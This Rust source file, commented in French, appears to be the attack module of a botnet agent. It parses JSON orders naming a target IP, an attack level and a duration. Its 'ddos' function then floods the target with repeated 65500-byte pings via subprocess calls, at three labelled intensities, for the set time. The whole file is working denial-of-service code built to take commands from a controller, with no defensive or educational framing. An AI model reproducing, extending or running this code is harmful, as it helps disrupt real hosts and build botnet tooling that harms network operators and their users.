use std::process::Command;
use std::thread;
use std::time::{Duration, Instant};
use serde::{Deserialize, Serialize};
use crate::function_utils::subprocess_run;
use crate::function_utils;


// a copier coller pour le json
#[derive(Serialize, Deserialize)]
struct DataReceived {
    id: String,
    attack: String,
    cible: String,
    level:String,
    time:u64
}
fn receive_data_json_to_str(data: String) -> DataReceived {
    let p = serde_json::from_str::<DataReceived>(&data).expect("Erreur JSON");
    p
}
#[derive(Serialize, Deserialize)]
struct DataSend {
    id: u32,
    attack: String,
    ipup: Vec<String>
}
fn send_json_data(ips:Vec<String>, received:DataReceived){

    let mut data = DataSend {
        id: 0, // Remplacez par la valeur appropriée
        attack: String::new(), // Remplacez par la valeur appropriée
        ipup: Vec::new(),
    };

    //data.id = received.id;
    //data.attack = received.attack;
    //data.ipup = ips;

    let json_string = serde_json::to_string(&data);

    println!("Serialized JSON: {:?}", json_string)
}

// a copier coller pour le json


pub(crate) fn ping(ip: String){
    let cmd= format!("ping {} -l 65500",ip);

    let sortie = subprocess_run(&*cmd);
}

pub(crate) fn check_ip(ip: String) -> bool {
    let mut ip_split = ip.split(".");
    let mut ip_split_vec_int: Vec<u32> = Vec::new();

    for i in ip_split {
        if let Ok(num) = i.parse::<u32>() {
            if num >= 0 && num <= 254 {
                ip_split_vec_int.push(num);
            } else {
                return false; // Si un numéro est en dehors de la plage, l'IP n'est pas valide
            }
        } else {
            return false; // Si la conversion échoue, l'IP n'est pas valide
        }
    }

    if ip_split_vec_int.len() == 4 {
        return true;
    }

    false
}

pub(crate) fn ddos(ordre:String){

    let data = receive_data_json_to_str(ordre);
    let ip = check_ip(data.cible.clone());
    let target_time = Duration::from_secs(data.time);
    let start_time = Instant::now();

    if ip == false {
        println!("L'ip n'est pas correcte");
        return;
    }else if ip == true {

        println!("Lancement de l'attaque {} niveau {} sur {} pendant {} secondes.", data.attack, data.level, data.cible, data.time);

        if data.level == "1" {
            //MODE : discret
            loop {
                if Instant::now() - start_time >= target_time {
                    break;
                }
                let cmd = format!("ping {} -n 1 -l 65500", data.cible.clone());
                let sortie = subprocess_run(&*cmd);

                // pause pour éviter d'envoyer des pings trop rapidement
                std::thread::sleep(Duration::from_secs(1));
            }

            println!("Fin de l'attaque");
        }else if data.level == "2" {
            //MODE : normal
            loop {
                if Instant::now() - start_time >= target_time {
                    break;
                }
                let cmd = format!("ping {} -l 65500", data.cible.clone());
                let sortie = subprocess_run(&*cmd);

                // pause pour éviter d'envoyer des pings trop rapidement
                std::thread::sleep(Duration::from_secs(1));
            }

            println!("Fin de l'attaque");
        }else if data.level == "3" {
            //MODE : avancé
            loop {
                if Instant::now() - start_time >= target_time {
                    break;
                }
                let cmd = format!("ping {} -n 1000 -l 65500", data.cible.clone());
                let sortie = subprocess_run(&*cmd);

                // pause pour éviter d'envoyer des pings trop rapidement
                std::thread::sleep(Duration::from_secs(1));
            }

            println!("Fin de l'attaque");
        }
    }else {
        println!("Erreur");
    }



}


